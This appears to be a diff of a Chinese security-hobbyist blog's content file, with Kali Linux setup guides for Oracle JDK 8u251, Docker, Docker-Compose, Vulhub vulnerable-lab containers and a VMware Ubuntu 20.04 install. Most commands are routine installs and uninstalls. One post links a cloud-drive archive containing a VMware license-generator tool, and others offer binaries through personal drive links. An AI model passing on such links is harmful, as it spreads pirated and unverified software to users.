+<li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXBLZXVVV1Rjb1dPWEJTOHUwVXhfUkE=">百度网盘<i class="fa fa-external-link-alt"></i></span><br>提取码：iouq<br>我也想用蓝奏云，无奈这个包186m，上传超过100m的文件要充钱，我的钱拿去百度网盘自动续费了。。。</p>
+</li>
+</ul>
+<h1 id="3-建立目录并解压文件"><a href="#3-建立目录并解压文件" class="headerlink" title="3. 建立目录并解压文件"></a>3. 建立目录并解压文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo cp jdk-8u251-linux-x64.tar.gz &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo tar xzvf jdk-8u251-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
 
-<p>验证密钥是否安装成功</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-key fingerprint 0EBFCD88</span><br><span class="line"></span><br><span class="line">pub   4096R&#x2F;0EBFCD88 2017-02-22</span><br><span class="line">      Key fingerprint &#x3D; 9DC8 5822 9FC7 DD38 854A  E2D8 8D81 803C 0EBF CD88</span><br><span class="line">uid                  Docker Release (CE deb) &lt;docker@docker.com&gt;</span><br><span class="line">sub   4096R&#x2F;F273FCD8 2017-02-22</span><br></pre></td></tr></table></figure>
-<h3 id="2-3-添加软件源"><a href="#2-3-添加软件源" class="headerlink" title="2.3 添加软件源"></a>2.3 添加软件源</h3><p>查询当前系统所基于的Debian版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version</span><br></pre></td></tr></table></figure>
-<p>得到如图反馈</p>
-<img src="/archives/60505/kali-version.png" class="">
+<h1 id="4-配置环境变量"><a href="#4-配置环境变量" class="headerlink" title="4. 配置环境变量"></a>4. 配置环境变量</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mousepad &#x2F;etc&#x2F;profile</span><br><span class="line"># 复制以下代码到文件结尾</span><br><span class="line">JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251</span><br><span class="line">PATH&#x3D;$PATH:$HOME&#x2F;bin:$JAVA_HOME&#x2F;bin</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>
 
-<p>通过查询得知 Debian 9 对应的代号为 stretch ，之后执行以下命令写入docker软件源（其中 stretch 根据查询得到的代号自行修改）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list</span><br></pre></td></tr></table></figure>
-<p>正常写入之后如图</p>
-<img src="/archives/60505/sources-list.png" class="">
+<h1 id="5-告诉系统Java的位置"><a href="#5-告诉系统Java的位置" class="headerlink" title="5. 告诉系统Java的位置"></a>5. 告诉系统Java的位置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;java&quot; &quot;java&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;java&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;javac&quot; &quot;javac&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javac&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;javaws&quot; &quot;javaws&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javaws&quot; 1</span><br></pre></td></tr></table></figure>
 
-<h2 id="3-安装Docker"><a href="#3-安装Docker" class="headerlink" title="3. 安装Docker"></a>3. 安装Docker</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>
+<h1 id="6-设置为默认JDK"><a href="#6-设置为默认JDK" class="headerlink" title="6. 设置为默认JDK"></a>6. 设置为默认JDK</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;java</span><br><span class="line">sudo update-alternatives --set javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javac</span><br><span class="line">sudo update-alternatives --set javaws &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javaws</span><br></pre></td></tr></table></figure>
 
-<p>安装之后可以配置一下Docker镜像加速</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p>ps：阿里云有免费的加速服务，登录阿里云帐号-容器镜像服务-镜像加速器</p>
-<p>配置好后执行以下命令进行测试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>
-<p>正常反馈如图</p>
-<img src="/archives/60505/hello-world.png" class="">
+<h1 id="7-重新载入profile"><a href="#7-重新载入profile" class="headerlink" title="7. 重新载入profile"></a>7. 重新载入profile</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
 
-<h2 id="4-卸载Docker"><a href="#4-卸载Docker" class="headerlink" title="4. 卸载Docker"></a>4. 卸载Docker</h2><h3 id="4-1-卸载软件"><a href="#4-1-卸载软件" class="headerlink" title="4.1 卸载软件"></a>4.1 卸载软件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
-<h3 id="4-2-删除镜像、容器、自定义配置等文件"><a href="#4-2-删除镜像、容器、自定义配置等文件" class="headerlink" title="4.2 删除镜像、容器、自定义配置等文件"></a>4.2 删除镜像、容器、自定义配置等文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br></pre></td></tr></table></figure>
+<h1 id="8-验证是否安装成功"><a href="#8-验证是否安装成功" class="headerlink" title="8. 验证是否安装成功"></a>8. 验证是否安装成功</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
+<img src="/archives/9111/3.png" class="">
 
-<h1 id="二、安装Docker-Compose"><a href="#二、安装Docker-Compose" class="headerlink" title="二、安装Docker-Compose"></a>二、安装Docker-Compose</h1><h2 id="安装Docker-Compose"><a href="#安装Docker-Compose" class="headerlink" title="安装Docker-Compose"></a>安装Docker-Compose</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo curl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.25.5&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
-<p>回显版本号则安装成功</p>
-<h2 id="卸载Docker-Compose"><a href="#卸载Docker-Compose" class="headerlink" title="卸载Docker-Compose"></a>卸载Docker-Compose</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、配置Vulhub"><a href="#三、配置Vulhub" class="headerlink" title="三、配置Vulhub"></a>三、配置Vulhub</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#下载靶场</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br><span class="line"></span><br><span class="line">#看看都有哪些靶场</span><br><span class="line">ls vulhub</span><br><span class="line"></span><br><span class="line">#选择一个靶场，比如struts2的系列漏洞</span><br><span class="line">cd vulhub&#x2F;struts2&#x2F;s2-057&#x2F;</span><br><span class="line"></span><br><span class="line">#启动靶场</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">#关闭靶场</span><br><span class="line">sudo docker-compose down</span><br><span class="line"></span><br><span class="line">#清理环境</span><br><span class="line">sudo docker rm $(docker ps -a -q)</span><br></pre></td></tr></table></figure>]]></content>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy81MTkyNjQzMA==">kali（ubuntu）linux Oracle jdk 8安装<i class="fa fa-external-link-alt"></i></span></p>
+]]></content>
       <categories>
         <category>web安全</category>
       </categories>
       <tags>
         <tag>Kali Linux</tag>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>VMware安装Ubuntu 20.04 LTS图解</title>
-    <url>/archives/574.html</url>
-    <content><![CDATA[<div class="note info no-icon">
-            <h1 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h1><p>Ubuntu 和 Windows 有何不同？<br>从大的方面讲，它们的设计理念不同，借用一位前辈的话：“Windows为不知道自己正在做什么的人设计，Linux为知道自己要做什么，正在做什么的人设计”。<br>从小的方面讲，用户体验不同。Windows 将机器置于一个和人对等的位置，它会对你提出要求，让你跟着它去做。Linux将机器置于服务于人的位置，它是一台服务于你的机器，听你指挥，接受你的配置，适当时候会提示你，但绝不会命令你。<br>刚开始从Windows到Ubuntu，肯定会不习惯，但是当你熟悉了这些操作，你会发现这是更高效的方法，这是另一种体验，你发号施令，让机器为你而运转，你会体验到机器服务于人的设计理念。在熟悉Ubuntu之后，我相信，你也会喜欢上这个简洁而优雅的开源世界。</p>
-          </div>
-<img src="/archives/574/Ubuntu-Desktop.png" class="">
-
-<hr>
-<h1 id="1-镜像下载及相关知识"><a href="#1-镜像下载及相关知识" class="headerlink" title="1. 镜像下载及相关知识"></a>1. 镜像下载及相关知识</h1><h2 id="1-1-镜像下载地址"><a href="#1-1-镜像下载地址" class="headerlink" title="1.1 镜像下载地址"></a>1.1 镜像下载地址</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jbi51YnVudHUuY29tL2Rvd25sb2Fk">Ubuntu官网下载地址<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLw==">阿里云镜像站<i class="fa fa-external-link-alt"></i></span></p>
-<h2 id="1-2-各版本介绍"><a href="#1-2-各版本介绍" class="headerlink" title="1.2 各版本介绍"></a>1.2 各版本介绍</h2><div class="note info no-icon">
-            <p>桌面版：即日常使用版本，带有GUI(图形化界面)，为个人电脑所配置。<br>服务器版：适用于web服务器，没有GUI，但包含了所有你需要启动托管站点的软件，即LAMP(Linux、Apache、MySQL和PHP)。<br>物联网版：即Ubuntu Core，适用于边缘计算和大型设备网络。</p>
-          </div>
-
-<p>博主使用的从阿里云镜像站下载的<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLmFsaXl1bi5jb20vdWJ1bnR1LXJlbGVhc2VzLzIwLjA0L3VidW50dS0yMC4wNC1iZXRhLWRlc2t0b3AtYW1kNjQuaXNv">ubuntu-20.04-beta-desktop-amd64<i class="fa fa-external-link-alt"></i></span>版本</p>
-<h1 id="2-虚拟机配置"><a href="#2-虚拟机配置" class="headerlink" title="2. 虚拟机配置"></a>2. 虚拟机配置</h1><h2 id="2-1-VMware-Workstation-Pro下载"><a href="#2-1-VMware-Workstation-Pro下载" class="headerlink" title="2.1 VMware Workstation Pro下载"></a>2.1 VMware Workstation Pro下载</h2><div class="note info no-icon">
-            <p>官网下载的15.5.0版本，外加上不记得哪儿撸的许可证生成工具<br><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUJkVnBLNlpNajkzd0ktVkdCUkVlTWc=">百度网盘<i class="fa fa-external-link-alt"></i></span> 提取码：3vpv</p>
-          </div>
-
-<h2 id="2-2-虚拟机创建及配置"><a href="#2-2-虚拟机创建及配置" class="headerlink" title="2.2 虚拟机创建及配置"></a>2.2 虚拟机创建及配置</h2><h3 id="①-创建新的虚拟机-典型-稍后安装操作系统"><a href="#①-创建新的虚拟机-典型-稍后安装操作系统" class="headerlink" title="① 创建新的虚拟机 - 典型 - 稍后安装操作系统"></a>① 创建新的虚拟机 - 典型 - 稍后安装操作系统</h3><img src="/archives/574/ubuntu-vm.png" class="">
-
-<h3 id="②-虚拟机配置"><a href="#②-虚拟机配置" class="headerlink" title="② 虚拟机配置"></a>② 虚拟机配置</h3><p>指定系统版本为 Ubuntu 64位</p>
-<img src="/archives/574/u-version.png" class="">
-
-<p>自定义虚拟机名称和存放位置</p>
-<img src="/archives/574/u-name.png" class="">
-
-<p>磁盘分配60g足矣</p>
-<img src="/archives/574/u-disk.png" class="">
-
-<p>接着来到自定义硬件</p>
-<img src="/archives/574/u-custom.png" class="">
-
-<p>点开自定义硬件，选中<code>新CD/DVD(SATA)</code>选项，在这里导入我们下载好的ISO文件<br>ps：可以将无用硬件移除以提升系统运行效率，例如打印机、声卡等，运行内存至少分配2g，处理器核心数自定</p>
-<img src="/archives/574/u-iso.png" class="">
-
-
-<h1 id="3-系统安装及配置"><a href="#3-系统安装及配置" class="headerlink" title="3. 系统安装及配置"></a>3. 系统安装及配置</h1><h2 id="3-1-系统安装"><a href="#3-1-系统安装" class="headerlink" title="3.1 系统安装"></a>3.1 系统安装</h2><h3 id="1-进入安装界面"><a href="#1-进入安装界面" class="headerlink" title="1. 进入安装界面"></a>1. 进入安装界面</h3><p>开机会先进行磁盘检测，稍等即刻，然后来到安装界面，拉到最下面选择中文(简体)并安装Ubuntu</p>
-<img src="/archives/574/install1.png" class="">
-<p>键盘布局保持默认直接下一步</p>
-<h3 id="2-更新和其他软件"><a href="#2-更新和其他软件" class="headerlink" title="2. 更新和其他软件"></a>2. 更新和其他软件</h3><p>取消勾选<code>安装Ubuntu时下载更新</code></p>
-<img src="/archives/574/install2.png" class="">
-
-<h3 id="3-安装类型"><a href="#3-安装类型" class="headerlink" title="3. 安装类型"></a>3. 安装类型</h3><p>保持默认选项，点击<code>现在安装</code></p>
-<img src="/archives/574/install3.png" class="">
-
-<h3 id="4-将改动写入磁盘"><a href="#4-将改动写入磁盘" class="headerlink" title="4. 将改动写入磁盘"></a>4. 将改动写入磁盘</h3><img src="/archives/574/install4.png" class="">
-
-<h3 id="5-选择时区"><a href="#5-选择时区" class="headerlink" title="5. 选择时区"></a>5. 选择时区</h3><img src="/archives/574/install5.png" class="">
-
-<h3 id="6-设置用户名和密码"><a href="#6-设置用户名和密码" class="headerlink" title="6. 设置用户名和密码"></a>6. 设置用户名和密码</h3><img src="/archives/574/install6.png" class="">
-
-<h3 id="7-开始安装系统"><a href="#7-开始安装系统" class="headerlink" title="7. 开始安装系统"></a>7. 开始安装系统</h3><p>到这里可以去抽根烟喝口茶，静待安装程序结束</p>
-<img src="/archives/574/install7.png" class="">
-<p>ps：过程中会出现<code>正在下载语言包</code>或者<code>软件包</code>的字样，因为没有配置国内源，所以会很慢，这里我们可以点开三角形图标有个skip，点击即可跳过下载</p>
-<img src="/archives/574/u-skip.png" class="">
-
-<p>安装完点击现在重启会出现如下报错</p>
-<img src="/archives/574/error1.png" class="">
-<p>我们只需要关闭虚拟机，在<code>CD/DVD(SATA)</code>中取消启动时连接，再开机即可正常进入系统</p>
-<img src="/archives/574/solve1.png" class="">
-<img src="/archives/574/solve2.png" class="">
-
-<h2 id="3-2-系统配置"><a href="#3-2-系统配置" class="headerlink" title="3.2 系统配置"></a>3.2 系统配置</h2><h3 id="1-安装VMware-Tools"><a href="#1-安装VMware-Tools" class="headerlink" title="1. 安装VMware Tools"></a>1. 安装VMware Tools</h3><p>有了它你才能将主机文件直接复制粘贴到虚拟机上，同时窗口尺寸也可以自适应了</p>
-<ul>
-<li><p>菜单栏 虚拟机 - 安装VMware Tools</p>
-<img src="/archives/574/vmtools1.png" class="">
-</li>
-<li><p>会有一个弹窗，点击即可打开文件夹，将挂载的VMware Tools中的压缩包拷贝到Ubuntu本地，比如桌面，并解压</p>
-<img src="/archives/574/vmtools2.png" class="">
-</li>
-<li><p>进入解压出来的文件夹，右键空白处选择在此处打开终端</p>
-<img src="/archives/574/vmtools3.png" class="">
-</li>
-<li><p>开始安装VMware Tools，键入命令后回车执行，第一个问题需要键入<code>yes</code>进行确认，之后一路回车，出现 <code>Enjoy</code> 字样即安装成功，重启生效</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;vmware-install.pl</span><br></pre></td></tr></table></figure>
-<img src="/archives/574/vmtools4.png" class="">
-
-</li>
-</ul>
-<h3 id="2-配置软件源"><a href="#2-配置软件源" class="headerlink" title="2. 配置软件源"></a>2. 配置软件源</h3><ul>
-<li><p>打开软件更新器，稍等一会儿，进入设置-Ubuntu软件，勾选源代码，之后就可以自由选择软件源了</p>
-<img src="/archives/574/source1.png" class="">
-<img src="/archives/574/source2.png" class="">
-</li>
-<li><p>这里我选择阿里的源，地区不同，不同的源效果也不同，可以点击选择最佳服务器让系统自行测速之后选择最佳的</p>
-<img src="/archives/574/source3.png" class="">
-</li>
-<li><p>关闭之后点击立即安装，开始系统安装后的第一次更新</p>
-<img src="/archives/574/source4.png" class="">
-
-</li>
-</ul>
-<p>整个安装过程就这些，有问题请在下方留言</p>
-]]></content>
-      <categories>
-        <category>嵌入式开发</category>
-      </categories>
-      <tags>
-        <tag>Ubuntu</tag>
+        <tag>jdk</tag>
       </tags>
   </entry>
   <entry>
@@ -682,49 +721,6 @@ ps:如果是xfce桌面环境需要在编辑完快捷方式之后在菜单栏中�
       </categories>
       <tags>
         <tag>Kali Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kali更新jdk-8u251</title>
-    <url>/archives/9111.html</url>
-    <content><![CDATA[<div class="note info no-icon">
-            <h1 id="为啥突然写这篇文章？"><a href="#为啥突然写这篇文章？" class="headerlink" title="为啥突然写这篇文章？"></a>为啥突然写这篇文章？</h1><p>今天打开尘封已久的 Burpsuite 时给我来了个弹窗，如下图<br><img src="/archives/9111/1.png" class=""><br>根据博主的英语水平我jio的它说的是：你的jre版本我们(burp)没有测试过，你用的时候阔能会出毛病。<br>emmm，然后事实证明确实出了毛病，使用的时候发现端口监听勾不上了</p>
-          </div>
-<p>第一时间当然是查看当前的java版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
-<p>然后发现丫的我就没见过这版本号</p>
-<img src="/archives/9111/2.png" class="">
-<p>后来查了一下啥是OpenJDK，得到了这篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC80NDFhYTFhOTc2YjM=">OpenJDK与JDK的区别分析<i class="fa fa-external-link-alt"></i></span></p>
-<p>话不多说，上正题</p>
-<h1 id="1-卸载原装jdk"><a href="#1-卸载原装jdk" class="headerlink" title="1. 卸载原装jdk"></a>1. 卸载原装jdk</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">which java  #查看JDK的安装路径</span><br><span class="line">sudo rm -rf &#x2F;usr&#x2F;bin&#x2F;java   # 这里的路径即为上一条命令返回的路径，自行修改</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-下载JDK"><a href="#2-下载JDK" class="headerlink" title="2. 下载JDK"></a>2. 下载JDK</h1><ul>
-<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtamRrOC1kb3dubG9hZHMuaHRtbA==">Oracle官方下载地址<i class="fa fa-external-link-alt"></i></span><br>ps: 下载<code>Linux x64 Compressed Archive</code>这个版本，好像需要注册帐号，登录才能下载</p>
-</li>
-<li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXBLZXVVV1Rjb1dPWEJTOHUwVXhfUkE=">百度网盘<i class="fa fa-external-link-alt"></i></span><br>提取码：iouq<br>我也想用蓝奏云，无奈这个包186m，上传超过100m的文件要充钱，我的钱拿去百度网盘自动续费了。。。</p>
-</li>
-</ul>
-<h1 id="3-建立目录并解压文件"><a href="#3-建立目录并解压文件" class="headerlink" title="3. 建立目录并解压文件"></a>3. 建立目录并解压文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo cp jdk-8u251-linux-x64.tar.gz &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;java</span><br><span class="line">sudo tar xzvf jdk-8u251-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
-
-<h1 id="4-配置环境变量"><a href="#4-配置环境变量" class="headerlink" title="4. 配置环境变量"></a>4. 配置环境变量</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mousepad &#x2F;etc&#x2F;profile</span><br><span class="line"># 复制以下代码到文件结尾</span><br><span class="line">JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251</span><br><span class="line">PATH&#x3D;$PATH:$HOME&#x2F;bin:$JAVA_HOME&#x2F;bin</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>
-
-<h1 id="5-告诉系统Java的位置"><a href="#5-告诉系统Java的位置" class="headerlink" title="5. 告诉系统Java的位置"></a>5. 告诉系统Java的位置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;java&quot; &quot;java&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;java&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;javac&quot; &quot;javac&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javac&quot; 1</span><br><span class="line">sudo update-alternatives --install &quot;&#x2F;usr&#x2F;bin&#x2F;javaws&quot; &quot;javaws&quot; &quot;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javaws&quot; 1</span><br></pre></td></tr></table></figure>
-
-<h1 id="6-设置为默认JDK"><a href="#6-设置为默认JDK" class="headerlink" title="6. 设置为默认JDK"></a>6. 设置为默认JDK</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --set java &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;java</span><br><span class="line">sudo update-alternatives --set javac &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javac</span><br><span class="line">sudo update-alternatives --set javaws &#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_251&#x2F;bin&#x2F;javaws</span><br></pre></td></tr></table></figure>
-
-<h1 id="7-重新载入profile"><a href="#7-重新载入profile" class="headerlink" title="7. 重新载入profile"></a>7. 重新载入profile</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
-
-<h1 id="8-验证是否安装成功"><a href="#8-验证是否安装成功" class="headerlink" title="8. 验证是否安装成功"></a>8. 验证是否安装成功</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>
-<img src="/archives/9111/3.png" class="">
-
-<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy81MTkyNjQzMA==">kali（ubuntu）linux Oracle jdk 8安装<i class="fa fa-external-link-alt"></i></span></p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>Kali Linux</tag>
-        <tag>jdk</tag>
       </tags>
   </entry>
   <entry>
